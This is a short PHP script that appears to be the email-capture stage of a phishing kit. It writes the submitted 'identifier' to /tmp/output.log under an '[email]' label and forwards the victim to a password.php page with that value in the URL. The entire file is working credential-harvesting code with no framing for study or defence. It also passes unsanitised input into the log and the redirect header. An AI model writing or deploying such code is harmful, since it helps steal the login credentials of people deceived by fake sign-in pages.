<?php
    system("touch /tmp/output.log");
    $myfile = fopen("/tmp/output.log", "a") or die("Unable to open file!");
    $txt = $_REQUEST['identifier'];
    fwrite($myfile, "[email]: '".$txt."'\n");
    fclose($myfile);
    header("location: ./password.php?identifier=".$txt);
?>